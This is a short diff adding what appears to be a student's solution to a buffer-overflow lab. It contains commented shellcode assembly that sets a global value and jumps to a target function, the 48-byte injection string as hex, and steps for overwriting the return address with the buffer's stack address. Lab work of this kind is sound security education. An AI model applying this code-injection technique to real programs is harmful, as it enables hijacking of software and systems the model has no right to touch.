@@ -1,0 +1,6 @@
+/* movl    $0x118e7330, 0x0804c218 */
+/* pushl   $0x08048d05 */
+/* ret */
+/* above is attack assemble code , use objdump disassemble it to get binary machine code(16 bytes in all) */
+/* and then set 44-48 bytes(return address) as buf's prior address(use gdb and breakpoint to get, %ebp - 0x28) to execute attack code */
+c7 05 18 c2 04 08 30 73 8e 11 68 05 8d 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 35 68 55
